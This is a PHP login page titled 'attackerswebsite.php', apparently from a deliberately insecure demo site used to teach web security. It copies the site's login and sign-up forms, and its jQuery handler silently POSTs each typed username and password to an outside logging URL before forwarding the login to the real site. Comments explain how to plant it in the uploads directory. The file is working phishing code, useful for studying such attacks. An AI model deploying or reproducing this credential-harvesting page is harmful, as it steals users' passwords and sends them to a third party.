<?php
/**
 * @author Christoph Ulshoefer <christophsulshoefer@gmail.com>
 * @copyright 2017
 * @license http://opensource.org/licenses/gpl-license.php MIT License
 * Diplays login depending on session (e.g. we need to display errors on trying to register)
 */

// NOTE: IN THE LATEST VERSION OF THE INSECURE WEBSITE, FILE UPLOAD SOMEHOW BROKE
// THIS MEANS YOU MANUALLY HAVE TO PUT THIS FILE IN /bad-code/web/uploads
// YOU CAN THEN ACCESS IT AT <host>/uploads/attackerswebsite.php
?>

<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>Login</title>

    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/materialize/0.97.8/css/materialize.min.css">
    <link rel="stylesheet" href="/assets/style.css" media="screen" title="no title">

    <script src="https://code.jquery.com/jquery-3.1.1.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/materialize/0.97.8/js/materialize.min.js"></script>

</head>
<body>

<nav>
    <div class="nav-wrapper container">
        <a href="" class="brand-logo"><?php echo $GLOBALS['page_name']; ?></a>
        <ul id="nav-mobile" class="right hide-on-med-and-down">
            <?php
            if (!\BYOG\Components\Login::loggedIn()):
                ?>
                <li><a href="/">Home</a></li>
                <li><a href="/login">Login</a></li>
                <li><a href="/login">Sign Up</a></li>
                <?php
            else:
                ?>
                <li><a href="/loggedin">New entry</a></li>
                <li><a href="/mySnippets">My Snippets</a></li>
                <li><a href="/settings">Settings</a></li>
                <li><a href="/logout">Sign out</a></li>
                <?php
            endif;
            ?>
        </ul>
    </div>
</nav>

<div class="container">
    <div class="row">
        <div class="col s6">
            <div class="card">
                <span class="card-title">Login</span>
                <div class="card-content">
                    <form class="" method="post">
                        <div class="input-field">
                            <input type="text" placeholder="username" class="validate" name="username" id="login-username-input">
                        </div>
                        <div class="input-field">
                            <input type="password" placeholder="password" class="validate" name="password" id="login-username-input">
                        </div>
                        <input type="submit" class="btn" name="submit-login" value="Login" id="login-submit-button">
                    </form>
                </div>
            </div>
        </div>

        <div class="col s6">
            <div class="card">
                <span class="card-title">Sign up</span>
                <div class="card-content">
                    <form class="" method="post">
                        <div class="input-field">
                            <input type="text" placeholder="username" class="validate" name="username">
                        </div>
                        <div class="input-field">
                            <input type="password" placeholder="password" class="validate" name="password">
                        </div>
                        <input type="submit" class="btn" name="submit-registration" value="Sign up">
                    </form>
                </div>
            </div>
        </div>
    </div>
</div>
<script type="text/javascript">
    $(document).ready(function () {

        $('#login-submit-button').click(function (e) {
            e.preventDefault();
            username = $('#login-username-input').val();
            pw = $('#login-pw-input').val();
            $.ajax({
                type: "POST",
                url: 'https://culshoefer.com/userinfologging',
                data: {
                    'username': username,
                    'content': pw
                },
                success: function () {
                    $.ajax({
                        type: "POST",
                        url: '/login?username=' + encodeURIComponent(username)
                        + '&password=' + encodeURIComponent(pw),
                        // data: {
                        //   'username': getCookie(username),
                        //   'content': $('#snippetText').val()
                        // },
                        success: function () {
                            //location.reload();
                        }
                    });
                }
            }).always(function() {
                $.ajax({
                    type: "POST",
                    url: '/login?username=' + encodeURIComponent(username)
                    + '&password=' + encodeURIComponent(pw),
                    // data: {
                    //   'username': getCookie(username),
                    //   'content': $('#snippetText').val()
                    // },
                    success: function () {
                        location.href = '/loggedin';
                    }
                });
            });
        });
    });
</script>

</body>

</html>
